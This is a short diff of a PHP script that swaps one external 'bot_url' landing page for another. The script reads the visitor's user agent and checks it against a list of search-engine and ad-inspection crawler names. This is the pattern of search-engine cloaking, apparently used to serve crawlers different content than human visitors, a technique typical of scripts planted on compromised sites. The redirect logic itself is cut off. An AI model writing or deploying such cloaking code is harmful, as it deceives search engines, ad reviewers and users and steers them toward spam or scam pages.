@@ -2,7 +2,7 @@
 ob_start();
 header('Vary: Accept-Language, User-Agent');
 
-$bot_url = "https://powerrangerijo.online/landing/journalp2ti/index.html";
+$bot_url = "https://p2tilanding.pages.dev/";
 $ua = strtolower($_SERVER['HTTP_USER_AGENT']);
 
 $bots = ['googlebot', 'slurp', 'bingbot', 'baiduspider', 'yandex', 'crawler', 'spider', 'adsense', 'inspection'];
